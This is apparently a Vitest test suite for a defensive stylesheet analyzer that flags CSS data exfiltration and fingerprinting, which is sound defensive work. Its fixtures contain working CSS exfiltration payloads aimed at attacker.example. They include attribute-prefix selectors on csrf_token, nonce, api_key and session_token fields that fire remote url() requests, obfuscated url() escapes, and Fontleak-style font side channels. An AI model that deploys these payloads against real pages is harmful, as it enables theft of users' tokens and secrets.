import { describe, expect, it, vi } from "vitest";
import { analyzeStylesheet } from "../../../src/core/analyzer/analyzeStylesheet";
import { parseAttributeSelectors } from "../../../src/core/analyzer/analyzeSelector";
import { extractUrls } from "../../../src/core/css/normalizeUrl";
import { parseCss } from "../../../src/core/css/parseCss";

const pageUrl = "https://app.example.test/account";
function analyze(cssText: string) { return analyzeStylesheet({ cssText, pageUrl, sourceKind: "style_element", sourceUrl: pageUrl }); }

describe("core analyzer", () => {
  it("detects classic value-prefix CSS exfil", () => {
    const summary = analyze('input[value^="a"]{background-image:url("https://attacker.example/a")}');
    expect(summary.findings.some((finding) => finding.reasons.includes("selector.attribute.prefix_match"))).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("sink.remote_url"))).toBe(true);
  });

  it("does not confuse data-value with value", () => {
    const attrs = parseAttributeSelectors('[data-value="0"]');
    expect(attrs).toEqual([{ name: "data-value", operator: "=", value: "0", flags: null }]);
    const summary = analyze('[data-value="0"]{background:url("/local.png")}');
    expect(summary.findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
  });

  it("treats remote URLs containing ;base64, as remote", () => {
    const [pathUrl] = extractUrls('url("https://attacker.example/;base64,pwned.png")', pageUrl);
    const [fragmentUrl] = extractUrls('url("https://attacker.example/a.png#;base64,")', pageUrl);
    expect(pathUrl.isRemote).toBe(true);
    expect(fragmentUrl.isRemote).toBe(true);
    expect(pathUrl.isData).toBe(false);
  });

  it("classifies data URLs as data, not remote", () => {
    const [url] = extractUrls("url(data:image/png;base64,iVBORw0KGgo=)", pageUrl);
    expect(url.isData).toBe(true);
    expect(url.isRemote).toBe(false);
  });

  it("detects CSS custom-property URL indirection and fallback chains", () => {
    const summary = analyze(':root{--leak:url(https://attacker.example/v)} input[name="csrf"][value^="a"]{background:var(--missing,var(--leak))}');
    expect(summary.findings.some((finding) => finding.reasons.includes("css.custom_property.url_sink"))).toBe(true);
    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
  });

  it("recursively walks nested grouping rules", () => {
    const rules = parseCss({ cssText: '@media screen{@supports selector(:has(*)){input[value^="x"]{background:url(https://attacker.example/x)}}}', pageUrl, sourceKind: "style_element", sourceUrl: pageUrl });
    expect(rules).toHaveLength(1);
    expect(rules[0].context.atRuleStack).toHaveLength(2);
    const summary = analyze('@media screen{@supports selector(:has(*)){input[value^="x"]{background:url(https://attacker.example/x)}}}');
    expect(summary.findings.some((finding) => finding.reasons.includes("css.grouping_rule.nested"))).toBe(true);
  });

  it("detects :has() sensitive selectors", () => {
    const summary = analyze('form:has(input[name="nonce"][value^="n"]){background:url(https://attacker.example/n)}');
    expect(summary.findings.some((finding) => finding.reasons.includes("selector.relational.has"))).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("selector.attribute.sensitive_name"))).toBe(true);
  });

  it("handles comments, escapes, and mixed case around url/import tokens", () => {
    expect(analyze('input[value^="c"]{background-image:u/**/rl(https://attacker.example/c)}').findings.length).toBeGreaterThan(0);
    expect(analyze('input[value^="e"]{background-image:u\\72l(https://attacker.example/e)}').findings.length).toBeGreaterThan(0);
    expect(analyze('@ImPoRt url(https://attacker.example/import.css);').findings.length).toBeGreaterThan(0);
  });

  it("redacts sensitive selector values from findings", () => {
    const summary = analyze('input[name="csrf_token"][value^="secret"]{background:url(https://attacker.example/x)}');
    const serialized = JSON.stringify(summary.findings);
    expect(serialized).not.toContain("secret");
    expect(serialized).not.toContain("value^=\"secret\"");
    expect(serialized).toContain("[redacted]");
  });

  it("redacts token-like attribute values while preserving diagnostic shape", () => {
    const summary = analyze('input[data-token="abcd1234abcd1234abcd1234"]{background:url(https://attacker.example/x)}');
    const serialized = JSON.stringify(summary.findings);
    expect(serialized).not.toContain("abcd1234abcd1234abcd1234");
    expect(serialized).toContain("data-token");
    expect(serialized).toContain("[redacted]");
  });

  it("uses the hardened parser for namespace, escaped property, and escaped url syntax", () => {
    const summary = analyze('@namespace svg url("http://www.w3.org/2000/svg"); @media screen { input[name="csrf_token"][value^="a"] { back\\67 round-image: u\\72l("https://attacker.example/ns") } }');
    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("css.grouping_rule.nested"))).toBe(true);
    expect(JSON.stringify(summary.findings)).not.toContain('value^="a"');
  });

  it("parses nested CSS style rules when supported by the hardened parser", () => {
    const summary = analyze('.profile { & input[name="nonce"][value$="z"] { background-image: url("https://attacker.example/nested-style") } }');
    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("selector.attribute.suffix_match"))).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("css.grouping_rule.nested"))).toBe(true);
  });

  it("recovers conservatively from malformed declaration separators", () => {
    const summary = analyze('@media screen { input[name="api_key"][value^="x"] { background-image: url("https://attacker.example/malformed") color: red } }');
    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("selector.attribute.sensitive_name"))).toBe(true);
  });


  it("does not treat common UI substring selectors as sensitive value probes", () => {
    expect(analyze('[class*="icon-"]::before{font-family:IconFont}').findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
    expect(analyze('[data-light-theme*="dark"] .octicon{background-image:url("https://github.githubassets.com/images/theme.svg")}').findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
    expect(analyze('input[type="password"].f-input[disabled]{background-image:url("/content/img/disabled.svg")}').findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
  });

  it("does not block common third-party font stylesheet imports", () => {
    expect(analyze('@import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap");').findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
    expect(analyze('@import url("https://use.typekit.net/abcd123.css");').findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
    expect(analyze('@import url("https://attacker.example/import.css");').findings.length).toBeGreaterThan(0);
  });


  it("reports partial coverage when the analysis time budget is exceeded", () => {
    const now = vi.spyOn(Date, "now");
    try {
      now.mockReturnValueOnce(0).mockReturnValue(10_000);
      const summary = analyzeStylesheet({
        cssText: 'input[name="csrf_token"][value^="a"]{background:url(https://attacker.example/budget)}',
        pageUrl,
        sourceKind: "style_element",
        sourceUrl: pageUrl,
      });
      expect(summary.state).toBe("analysis.skipped.performance_budget");
      expect(summary.partialStylesheets).toBeGreaterThan(0);
      expect(summary.findings.some((finding) => finding.reasons.includes("analysis.skipped.performance_budget"))).toBe(true);
    } finally {
      now.mockRestore();
    }
  });


  it("reports partial coverage when source parsing reaches the analysis time budget", () => {
    const now = vi.spyOn(Date, "now");
    try {
      now.mockReturnValueOnce(0).mockReturnValueOnce(0).mockReturnValue(10_000);
      const hugeMalformedCss = `${" ".repeat(12_000)}@media screen { input[name="csrf_token"][value^="a"] { background:url(https://attacker.example/budget-parse) }`;
      const summary = analyzeStylesheet({
        cssText: hugeMalformedCss,
        pageUrl,
        sourceKind: "style_element",
        sourceUrl: pageUrl,
      });
      expect(summary.state).toBe("analysis.skipped.performance_budget");
      expect(summary.partialStylesheets).toBe(1);
      expect(summary.findings.some((finding) => finding.reasons.includes("analysis.skipped.performance_budget"))).toBe(true);
    } finally {
      now.mockRestore();
    }
  });

  it("scans oversized stylesheets instead of reporting a too-large skip", () => {
    const now = vi.spyOn(Date, "now");
    try {
      now.mockReturnValue(0);
      const padding = Array.from({ length: 16_000 }, (_, index) => `.pad-${index}{margin:${index % 17}px}`).join("\n");
      const summary = analyze(`${padding}\ninput[name="csrf_token"][value^="z"]{background-image:url("https://attacker.example/oversized-z")}`);
      expect(summary.state).not.toBe("analysis.skipped.too_large");
      expect(summary.partialStylesheets).toBe(0);
      expect(summary.analyzedStylesheets).toBe(1);
      expect(summary.findings.some((finding) => finding.reasons.includes("analysis.skipped.too_large"))).toBe(false);
      expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
    } finally {
      now.mockRestore();
    }
  });

  it("continues scanning after the report cap and retains stronger later findings", () => {
    const noisyRemoteFindings = Array.from({ length: 20 }, (_, index) => `input[value^="${String.fromCharCode(97 + (index % 26))}"]{background-image:url("https://attacker.example/noise-${index}")}`).join("\n");
    const summary = analyzeStylesheet({
      cssText: `${noisyRemoteFindings}\ninput[name="api_key"][value^="x"]{background-image:url("http://192.168.0.12/leak")}`,
      pageUrl,
      sourceKind: "style_element",
      sourceUrl: pageUrl,
      maxFindings: 1,
    });
    expect(summary.findings).toHaveLength(1);
    expect(summary.findings[0].destinationOrigin).toBe("http://192.168.0.12");
    expect(summary.findings[0].reasons).toContain("url.local_network");
  });

  it("supplements primary parsing with source scanning for late nested CSS rules", () => {
    const padding = Array.from({ length: 16_000 }, (_, index) => `.utility-${index}{display:block}`).join("\n");
    const summary = analyze(`${padding}\n.card{& input[name="session_token"][value*="abc"]{mask-image:url("https://attacker.example/nested-oversized")}}`);
    expect(summary.findings.some((finding) => finding.reasons.includes("selector.attribute.substring_match"))).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("css.grouping_rule.nested"))).toBe(true);
    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
  });

  it("preserves security-relevant nested source rules when normal parsing reaches the analysis budget", () => {
    let calls = 0;
    const budgetExceededAfterStart = () => calls++ === 0 ? 0 : 10_000;
    const padding = Array.from({ length: 16_000 }, (_, index) => `.utility-${index}{display:block}`).join("\n");
    const summary = analyzeStylesheet({
      cssText: `${padding}\n.card{& input[name="session_token"][value*="abc"]{mask-image:url("https://attacker.example/nested-budget")}}`,
      pageUrl,
      sourceKind: "style_element",
      sourceUrl: pageUrl,
      now: budgetExceededAfterStart,
    });
    expect(summary.state).toBe("analysis.skipped.performance_budget");
    expect(summary.findings.some((finding) => finding.reasons.includes("selector.attribute.substring_match"))).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("css.grouping_rule.nested"))).toBe(true);
    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
  });

  it("detects declaration-level inline attr() plus if(style()) CSS exfiltration", () => {
    const summary = analyze('div{--user:attr(data-user);background:image-set(if(style(--user:"admin"): "https://attacker.example/admin.png"; else: "https://attacker.example/user.png") 1x)}');
    expect(summary.findings.some((finding) => finding.reasons.includes("css.value.attr_source"))).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("css.value.conditional_if"))).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("css.value.style_query"))).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("sink.image_set_remote"))).toBe(true);
    expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
  });

  it("does not treat inline attr() conditionals without a remote sink as actionable", () => {
    const summary = analyze('div{--count:attr(data-count);color:if(style(--count:"5"):green;else:gray)}');
    expect(summary.findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
  });

  it("detects remote font plus container/keyframe URL side-channel shapes", () => {
    const containerSummary = analyze('@font-face{font-family:"Leak";src:url(https://attacker.example/leak.woff2)}.secret{font-family:"Leak";width:fit-content}@container (min-width:1px){.x{background:url(https://attacker.example/container)}}');
    expect(containerSummary.findings.some((finding) => finding.reasons.includes("sink.font_metric_side_channel"))).toBe(true);
    expect(containerSummary.findings.some((finding) => finding.reasons.includes("css.container_query"))).toBe(true);
    expect(containerSummary.findings.some((finding) => finding.reasons.includes("css.font_measurement_setup"))).toBe(true);
    const keyframeSummary = analyze('@font-face{font-family:"Leak";src:url(https://attacker.example/leak.woff2)}.secret{font-family:"Leak";animation:k 1s}@keyframes k{50%{background:url(https://attacker.example/key)}}');
    expect(keyframeSummary.findings.some((finding) => finding.reasons.includes("css.keyframes_remote_sink"))).toBe(true);
    expect(keyframeSummary.findings.some((finding) => finding.reasons.includes("css.font_animation_chain"))).toBe(true);
  });

  it("detects static Fontleak-style generated-content ligature measurement", () => {
    const summary = analyze('@font-face{font-family:"Leak";src:url(https://attacker.example/leak.woff2)}.leak{font-family:"Leak";font-feature-settings:"liga" 1;width:fit-content;white-space:pre}.leak::before{font-family:"Leak";content:"\\100"}@container (width:11px){head::before{content:url(https://attacker.example/glyph)}}');
    expect(summary.findings.some((finding) => finding.reasons.includes("css.font_generated_content_probe"))).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("css.font_ligature_feature"))).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("css.container_size_query"))).toBe(true);
  });

  it("does not treat disabled font-feature ligature values as active Fontleak ligature evidence", () => {
    const summary = analyze('@font-face{font-family:"Leak";src:url(https://attacker.example/leak.woff2)}.leak{font-family:"Leak";font-feature-settings:"liga" 0;width:fit-content}.leak::before{font-family:"Leak";content:"\\100"}@container (width:11px){head::before{content:url(https://attacker.example/glyph)}}');
    expect(summary.findings.some((finding) => finding.reasons.includes("css.font_ligature_feature"))).toBe(false);
  });

  it("does not treat ordinary remote webfonts in component container queries as Fontleak", () => {
    const summary = analyze('@font-face{font-family:"Ui";src:url(https://fonts.gstatic.com/ui.woff2)}.card{font-family:"Ui";container-type:inline-size}@container (min-width:30rem){.card{background:url(https://cdn.example.test/card.svg)}}');
    expect(summary.findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
  });

  it("keeps defensive CSS canary callbacks non-actionable by default", () => {
    const summary = analyze('html::before{content:"";background-image:url("https://canary.example.test/token.svg")}');
    expect(summary.findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
  });

  it("reports experimental CSS fingerprinting indicators only when the guard is enabled", () => {
    const cssText = '@media print{body{background-image:url("https://observer.example.test/printed.svg")}}';
    const defaultSummary = analyze(cssText);
    expect(defaultSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.print_signal"))).toBe(false);

    const guardedSummary = analyzeStylesheet({
      cssText,
      pageUrl,
      sourceKind: "style_element",
      sourceUrl: pageUrl,
      enableCssFingerprintingGuard: true,
    });
    expect(guardedSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.conditional_resource"))).toBe(true);
    expect(guardedSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.print_signal"))).toBe(true);
    expect(guardedSummary.findings.some((finding) => finding.destinationOrigin === "https://observer.example.test")).toBe(true);
  });

  it("parses @page remote resources as experimental print fingerprinting indicators", () => {
    const summary = analyzeStylesheet({
      cssText: '@page{background-image:url("https://observer.example.test/page.svg")}',
      pageUrl,
      sourceKind: "style_element",
      sourceUrl: pageUrl,
      enableCssFingerprintingGuard: true,
    });
    expect(summary.findings.some((finding) => finding.selector === "@page")).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.page_rule_signal"))).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.print_signal"))).toBe(true);
  });

  it("reports rendered-text pseudo-element fingerprinting indicators only when the guard is enabled", () => {
    const cssText = '@font-face{font-family:"RenderedLeak";src:url("https://attacker.example/rendered.woff2");unicode-range:U+0041}.secret::first-line{font-family:"RenderedLeak";text-transform:uppercase}';
    const defaultSummary = analyze(cssText);
    expect(defaultSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.rendered_text_signal"))).toBe(false);

    const guardedSummary = analyzeStylesheet({
      cssText,
      pageUrl,
      sourceKind: "style_element",
      sourceUrl: pageUrl,
      enableCssFingerprintingGuard: true,
    });
    expect(guardedSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.rendered_text_signal"))).toBe(true);
    expect(guardedSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.pseudo_element_signal"))).toBe(true);
    expect(guardedSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.browser_specific_text_signal"))).toBe(true);
  });

  it("reports overflow and scroll-state CSS fingerprinting indicators only when the guard is enabled", () => {
    const cssText = '@font-face{font-family:"ScrollLeak";src:url("https://attacker.example/scroll.woff2");unicode-range:U+0041}.scroll-probe{content-visibility:auto;overflow:auto;width:7ch;word-break:break-all;font-family:"ScrollLeak"}';
    const defaultSummary = analyze(cssText);
    expect(defaultSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.scroll_signal"))).toBe(false);

    const guardedSummary = analyzeStylesheet({
      cssText,
      pageUrl,
      sourceKind: "style_element",
      sourceUrl: pageUrl,
      enableCssFingerprintingGuard: true,
    });
    expect(guardedSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.layout_overflow_signal"))).toBe(true);
    expect(guardedSummary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.scroll_signal"))).toBe(true);
  });

  it("reports script text-node and reversed-text indicators as bounded CSS fingerprinting signals", () => {
    const cssText = '@font-face{font-family:"TextNodeLeak";src:url("https://attacker.example/text.woff2");unicode-range:U+0074}script{display:block;font-family:"TextNodeLeak"}.reversed-secret{direction:rtl;unicode-bidi:bidi-override;overflow:hidden;font-family:"TextNodeLeak"}';
    const summary = analyzeStylesheet({
      cssText,
      pageUrl,
      sourceKind: "style_element",
      sourceUrl: pageUrl,
      enableCssFingerprintingGuard: true,
    });
    expect(summary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.text_node_signal"))).toBe(true);
    expect(summary.findings.some((finding) => finding.reasons.includes("privacy.css_fingerprinting.browser_specific_text_signal"))).toBe(true);
  });

});
